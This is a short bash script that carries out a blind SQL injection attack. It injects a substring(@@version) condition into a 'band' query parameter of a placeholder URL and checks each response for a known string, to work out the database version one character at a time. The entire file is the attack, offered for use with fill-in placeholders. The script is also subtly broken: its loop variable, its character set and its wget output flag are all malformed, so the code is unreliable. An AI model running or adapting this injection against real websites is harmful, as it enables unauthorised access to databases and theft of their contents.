#!/bin/bash
#blind1.sh

charset='echo {0..9} {A..z} \. \: \, \; \- \_ \@'

export URL="http://[ENTER IN HERE]"
export truestring="We worked with them in the past [ENTER HERE]"

for 1 in $charset
do
	wget "$URL?band=the offspring' and substring(@@version,1,1)='$i" -q -0 - | grep "$truestring" &> /dev/null
	if  [ "$?" == 0 ]
	then
		echo Character found: $i
		break
	fi
done